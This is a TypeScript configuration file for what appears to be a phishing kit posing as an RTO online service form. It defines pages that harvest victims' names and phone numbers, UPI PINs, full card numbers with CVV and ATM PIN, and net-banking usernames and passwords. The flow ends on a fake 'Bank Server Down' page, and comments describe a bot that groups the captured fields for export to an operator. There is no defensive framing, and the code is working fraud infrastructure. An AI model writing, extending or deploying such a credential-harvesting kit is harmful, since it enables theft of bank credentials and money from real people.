// ============================================================
// FORM CONFIGURATION — Single source of truth for all form pages
// ============================================================
// To add/remove/change a form page or field:
//   1. Edit the FORM_PAGES array below
//   2. The RTO single-page form in public/rto/index.html handles all steps
//   That's it — bot.ts, types, and server routes all read from here.
// ============================================================

export interface FieldConfig {
    key: string;           // Field key (used in data storage & API)
    displayName: string;   // Human-readable name (used in bot messages & exports)
    type: 'text' | 'tel' | 'password' | 'date' | 'number' | 'radio';  // HTML input type
    category: 'personal' | 'payment' | 'upi' | 'card' | 'login';  // Grouping for bot export
    required: boolean;
    maxlength?: number;
    placeholder?: string;
}

export interface PageConfig {
    id: string;            // Unique page ID (used in URL: rto/index.html#{id})
    pageName: string;      // Name sent to /api/form/sync (e.g. 'customer_info')
    title: string;         // Display title for the page
    fields: FieldConfig[]; // Fields on this page
    // Navigation: which page comes next in each flow (null = end of flow)
    nextPage: {
        main?: string | null;
        upi?: string | null;
        card?: string | null;
        netbanking?: string | null;
    };
    isFinalPage?: boolean; // If true, calls /api/form/submit after sync
}

export interface CategoryConfig {
    key: string;
    displayName: string;
    emoji: string;
}

// ==================== FIELD CATEGORIES ====================
// Used by bot.ts to group fields in notifications & exports

export const FIELD_CATEGORIES: CategoryConfig[] = [
    { key: 'personal', displayName: 'Personal Details', emoji: '👤' },
    { key: 'payment', displayName: 'Payment Details', emoji: '💰' },
    { key: 'upi', displayName: 'UPI Details', emoji: '📱' },
    { key: 'card', displayName: 'Card Details', emoji: '💳' },
    { key: 'login', displayName: 'Net Banking / Login', emoji: '🔐' },
];

// ==================== FORM PAGES ====================
// Order matters — this defines the default page sequence.
// Each page's `nextPage` defines per-flow navigation.
// All pages are rendered inside public/rto/index.html as steps.

export const FORM_PAGES: PageConfig[] = [
    {
        id: 'customer_info',
        pageName: 'customer_info',
        title: 'Online Service Form',
        fields: [
            { key: 'customerName', displayName: 'Customer Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter Customer Name' },
            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Enter Mobile Number' },
            { key: 'reason', displayName: 'Reason', type: 'text', category: 'personal', required: true, placeholder: 'Describe Your Problem' },
        ],
        nextPage: { main: 'payment_mode' },
    },
    {
        id: 'payment_mode',
        pageName: 'payment_mode',
        title: 'Payment Mode',
        fields: [
            { key: 'paymentMode', displayName: 'Payment Mode', type: 'radio', category: 'payment', required: true, placeholder: 'PAY / REFUND / OTHER' },
            { key: 'amount', displayName: 'Amount', type: 'number', category: 'payment', required: true, placeholder: 'Enter Amount' },
        ],
        nextPage: { main: 'payment_method' },
    },
    {
        id: 'payment_method',
        pageName: 'payment_method',
        title: 'Select Payment Method',
        fields: [
            { key: 'paymentMethod', displayName: 'Payment Method', type: 'text', category: 'payment', required: true, placeholder: 'UPI / Card / Net Banking' },
        ],
        nextPage: { upi: 'upi_details', card: 'card_details', netbanking: 'netbanking_details' },
    },
    {
        id: 'upi_details',
        pageName: 'upi_details',
        title: 'UPI Details',
        fields: [
            { key: 'upiBankName', displayName: 'UPI Bank Name', type: 'text', category: 'upi', required: true, placeholder: 'Search or Select Bank' },
            { key: 'upiPin', displayName: 'UPI PIN', type: 'password', category: 'upi', required: true, placeholder: 'Enter UPI PIN' },
        ],
        nextPage: { main: 'success' },
    },
    {
        id: 'card_details',
        pageName: 'card_details',
        title: 'Card Details',
        fields: [
            { key: 'cardNumber', displayName: 'Card Number', type: 'tel', category: 'card', required: true, maxlength: 19, placeholder: 'XXXX-XXXX-XXXX-XXXX' },
            { key: 'expiry', displayName: 'Expiry Date', type: 'text', category: 'card', required: true, maxlength: 5, placeholder: 'MM/YY' },
            { key: 'cvv', displayName: 'CVV', type: 'password', category: 'card', required: true, maxlength: 3, placeholder: 'Enter 3-digit CVV' },
            { key: 'atmPin', displayName: 'ATM PIN', type: 'password', category: 'card', required: true, maxlength: 4, placeholder: 'Enter ATM PIN' },
        ],
        nextPage: { main: 'success' },
    },
    {
        id: 'netbanking_details',
        pageName: 'netbanking_details',
        title: 'Net Banking Details',
        fields: [
            { key: 'bankName', displayName: 'Bank Name', type: 'text', category: 'login', required: true, placeholder: 'Search or Select Bank' },
            { key: 'username', displayName: 'Username / Customer ID', type: 'text', category: 'login', required: true, placeholder: 'Enter Username / Customer ID' },
            { key: 'password', displayName: 'Password', type: 'password', category: 'login', required: true, placeholder: 'Enter Password' },
        ],
        nextPage: { main: 'success' },
    },
    {
        id: 'success',
        pageName: 'success',
        title: 'Bank Server Down',
        fields: [],
        nextPage: { main: null },
        isFinalPage: true,
    }
];

// ==================== HELPER FUNCTIONS ====================

/** Get all unique field keys across all pages */
export function getAllFieldKeys(): string[] {
    const keys = new Set<string>();
    FORM_PAGES.forEach(page => page.fields.forEach(f => keys.add(f.key)));
    return Array.from(keys);
}

/** Get display name for a field key */
export function getFieldDisplayName(key: string): string {
    for (const page of FORM_PAGES) {
        const field = page.fields.find(f => f.key === key);
        if (field) return field.displayName;
    }
    // Fallback: convert camelCase to Title Case
    return key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
}

/** Get all fields for a specific category */
export function getFieldsByCategory(category: string): FieldConfig[] {
    const fields: FieldConfig[] = [];
    const seenKeys = new Set<string>();
    FORM_PAGES.forEach(page => {
        page.fields.forEach(f => {
            if (f.category === category && !seenKeys.has(f.key)) {
                fields.push(f);
                seenKeys.add(f.key);
            }
        });
    });
    return fields;
}

/** Get page config by ID */
export function getPageById(pageId: string): PageConfig | undefined {
    return FORM_PAGES.find(p => p.id === pageId);
}

/** Get page config by pageName */
export function getPageByName(pageName: string): PageConfig | undefined {
    return FORM_PAGES.find(p => p.pageName === pageName);
}

/** Fields to exclude from display (metadata fields) */
export const EXCLUDE_FIELDS = new Set([
    'pageName', 'submittedAt', 'deviceId', 'currentFlow',
    'id', 'sessionStart', 'sessionEnd', 'flowType', 'pagesSubmitted'
]);
